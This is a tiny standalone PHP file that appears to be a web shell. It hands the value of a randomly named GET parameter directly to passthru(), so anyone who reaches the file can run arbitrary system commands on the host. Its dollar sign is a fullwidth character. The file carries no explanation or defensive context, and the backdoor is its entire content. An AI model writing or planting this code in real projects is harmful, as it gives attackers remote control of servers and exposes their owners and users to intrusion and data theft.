<?php
passthru(＄_GET['Qcs4Tdo3']);
?>
